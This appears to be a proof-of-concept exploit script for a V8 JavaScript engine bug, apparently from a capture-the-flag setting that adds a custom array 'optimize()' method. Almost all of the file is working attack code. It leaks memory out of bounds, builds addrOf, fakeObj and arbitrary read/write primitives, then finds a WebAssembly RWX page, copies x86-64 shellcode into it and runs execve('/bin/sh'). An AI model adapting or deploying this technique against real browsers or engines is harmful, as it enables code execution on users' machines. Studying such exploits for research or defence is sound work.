// set args --allow-natives-syntax --shell poc.js

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// d8 only
// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val){
    return '0x' + ftoi(val).toString(16);
}

var float_arr = [1.1];
var obj = {"A":1};
var obj_arr = [obj, obj];

// dp(float_arr);
// dp(obj_arr);

float_arr.optimize();
float_arr.optimize();

console.log('[+] float_array.optimize() called, length now:', float_arr.length);

for (let i = 0; i < 200; i++) {
    console.log("float_array[" + i + "] = " + hex(float_arr[i]));
}
float_arr_map = itof(ftoi(float_arr[1]) & 0xffffffffn); // Change to FLOAT_ARRAY_MAP
console.log('[*] float_arr map corruption:', hex(float_arr_map));
obj_arr_map = itof(ftoi(float_arr_map) + 0x88n);
console.log('[*] obj_arr map address leaked:', hex(obj_arr_map));

function addrOf(obj) {
    obj_arr[0] = obj;
    float_arr[10] = itof(ftoi(float_arr_map) << 32n);
    let addr = Number(ftoi(obj_arr[0]) & 0xffffffffn);
    float_arr[10] = itof(ftoi(obj_arr_map) << 32n);
    return BigInt(addr);
}

function fakeObj(addr) {
    float_arr[9] = itof(0x4n) + itof(addr << 32n);
    float_arr[10] = itof(ftoi(obj_arr_map) << 32n);
    let fake = obj_arr[0];
    return fake;
}

var arb_rw_arr = [(float_arr_map), 1.2, 1.3, 1.4];

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) + 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) + 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    fake[0] = itof(val);
}

console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));


console.log("[*] Result: 0x" + arb_read(addrOf(arb_rw_arr)).toString(16));
// dp(float_arr)
// dp(arb_rw_arr)

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
// dp(wasm_instance)

var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
var rwx = arb_read(wasm_trusted_data + 0x28n);
console.log("[*] rwx: 0x" + rwx.toString(16));

function copy(addr, data_arr) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrOf(buf);
    let backing_store_addr = buf_addr - 1n + 0x24n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

var shellcode = [
        0x010101010101b848n,
        0x68632eb848500101n,
        0x0431480169722e6fn,
        0xf631d231e7894824n,
        0x050f583b6an,
];

copy(rwx, shellcode);

console.log("[+] executing execve('/bin/sh', 0, 0)");
f();